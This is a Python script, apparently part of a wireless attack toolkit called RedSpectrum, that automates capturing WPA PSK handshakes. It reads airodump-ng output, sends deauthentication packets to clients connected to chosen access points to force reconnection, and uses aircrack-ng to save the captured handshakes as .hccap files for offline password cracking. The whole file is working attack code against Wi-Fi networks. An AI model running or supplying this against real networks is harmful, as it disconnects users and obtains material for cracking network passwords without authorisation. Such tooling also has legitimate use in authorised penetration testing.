#!/usr/bin/python
"""
RedSpectrum - get_handshakes.py
April 1, 2017
Leopold von Niebelschuetz-Godlewski

Grabs WPA PSK handshakes.
"""
import argparse, os, sys, time
from core import check_SSIDs, clean_AP_data, clean_station_data, clean_user_input, deauth, disable_interfering_processes, disable_monitor_mode, enable_monitor_mode, find_output_files, kill_process, print_error, print_success, print_warning, run_process
from config import MAX_CLIENT_DEAUTH, MAX_PROC_WAIT, MIN_ACKs
from parse_airodump import parse_APs, parse_stations, split_CSVs
from string import ascii_lowercase, digits

def getHandshakes(target_bssid,target_ssids,ListenInterface,AttackInterface,verbose=True):
	handshakes 				= []
	tested    		   	 	= []
	cleanAPs   				= clean_AP_data(APs)
	for bssid,essid,channel,privacy,authentication,AP_date in cleanAPs:
		if target_bssid and (not target_bssid.lower() in bssid.lower()): continue
		if (essid and '\\x00' not in essid and essid not in handshakes) and ((target_ssids and essid.lower() in target_ssids) or (not target_ssids)):
			cleanStations = clean_station_data(stations)
			for station_mac,connected_bssid,station_date in cleanStations:
				if (bssid == connected_bssid and channel != '-1') and (essid not in handshakes) and ((bssid,station_mac) not in tested):
					outFileName       						= "%s_%s_%s" % (''.join([c for c in essid.lower() if c in ascii_lowercase or c in digits]),bssid,channel)
					(ACK,(ListenInterface,AttackInterface)) = deauth(bssid,channel,station_mac,MAX_CLIENT_DEAUTH,outFileName,ListenInterface,AttackInterface,verbose)
					outFileNames,outCAPFile 				= find_output_files(outFileName,'.cap')
					handshakeFile							= 'W00T-'+outCAPFile.replace('.cap','')
					extractHandshake						= "aircrack-ng %s -J %s" % (outCAPFile,handshakeFile)
					stdout, stderr          				= run_process(extractHandshake,MAX_PROC_WAIT)
					if (ACK >= MIN_ACKs) and not ("Successfully written to %s" % handshakeFile+'.hccap' in stdout):
						if verbose: print_warning("Too many deauthentication packets sent to \"%s\", the station's wireless card is having issues reconnecting... Try running this script against \"%s / %s\" later..." % (station_mac,essid,bssid))
					elif "Successfully written to %s" % handshakeFile+'.hccap' in stdout:
						newOutCAPFile = "W00T-"+outCAPFile
						os.rename(outCAPFile,newOutCAPFile)
						if verbose: print_success("Handshake captured for the \"%s\" SSID! Output written to \"%s\" and \"%s\"" % (essid,newOutCAPFile,handshakeFile+'.hccap'))
						handshakes.append(essid)
					for outFile in outFileNames:
						try:
							os.remove(outFile)
						except:
							pass
					tested.append((bssid,station_mac))
				else:
					pass
	if not tested:
		if verbose: print_error("No clients are connected to target SSID(s) and/or BSSID...")
	return handshakes

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("ListenInt", help="wireless interface name to be used for listening (e.g. wlan0)", type=str)
	parser.add_argument("AttackInt", help="wireless interface name to be used for attacking (e.g. wlan0)", type=str)
	parser.add_argument("-b", "--bssid", help="target BSSID (e.g. 6a:55:35:9b:9b:69)", type=str)
	parser.add_argument("-c", "--csv", help="Airodump-ng output files (e.g. inside.csv outside.csv)", type=str, nargs='+')
	parser.add_argument("-s", "--ssids", help="target SSIDs (e.g. \"Secured WiFi\" CorpNet LabNet)", type=str, nargs='+')
	args = parser.parse_args()
	if args.ssids:
		ssids = [ssid.lower() for ssid in args.ssids]
	else:
		ssids = args.ssids
	APFileName,stationFileName = split_CSVs(args.csv)
	APs        				   = parse_APs()
	if ssids: check_SSIDs(APs,ssids)
	stations   				   = parse_stations()
	disable_interfering_processes()
	handshakes 				   = getHandshakes(args.bssid,ssids,clean_user_input(args.ListenInt),clean_user_input(args.AttackInt))
	for file in (APFileName,stationFileName):
		try:
			os.remove(file)
		except:
			pass